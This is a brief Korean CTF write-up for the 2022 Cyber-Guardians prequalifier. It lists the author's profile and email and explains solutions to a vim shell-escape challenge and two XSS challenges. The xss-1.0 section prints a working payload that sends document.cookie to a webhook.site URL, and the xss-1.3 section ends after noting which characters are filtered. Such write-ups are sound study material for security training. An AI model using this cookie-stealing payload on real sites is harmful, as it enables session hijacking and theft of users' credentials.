# 2022 Cyber-Guardians CTF Prequal

## Dreamhack Profile
Nickname: suk-6

email: wsuk.nam@gmail.com

## Solve list
A - Sanity Check!

I - xss-1.0

J - xss-1.3

### Sanity Check!
Netcat으로 원격 서버에 접속하였더니 vim 편집창이 나온다.

vim 편집기에서 !를 붙이고 Shell 명령어를 작성하면 실행되는 기능을 활용하여 루트 디렉토리의 파일을 조회하고 head 명령어로 flag 파일을 불러왔다.

### xss-1.0
로컬 Chrome 안에 쿠키 값이 들어있는데, XSS 취약점을 이용해 이 값을 확인하는 문제이다.

`location.href`를 이용하여 webhook.site로 리다이렉트 시켰다.

이 때 `document.cookie`를 이용하여 브라우저의 쿠키를 URI에 담아서 보냈다.

```<svg/onload=location["href"]="https://webhook.site/webhook-id/?flag="+document["cookie"]>```

### xss-1.3
xss-1.0과 같이 로컬 Chrome 안에 쿠키 값이 들어있는데, XSS 취약점을 이용해 이 값을 확인하는 문제이다.

다만, `'`, `"`, `=`를 필터링하고 있다.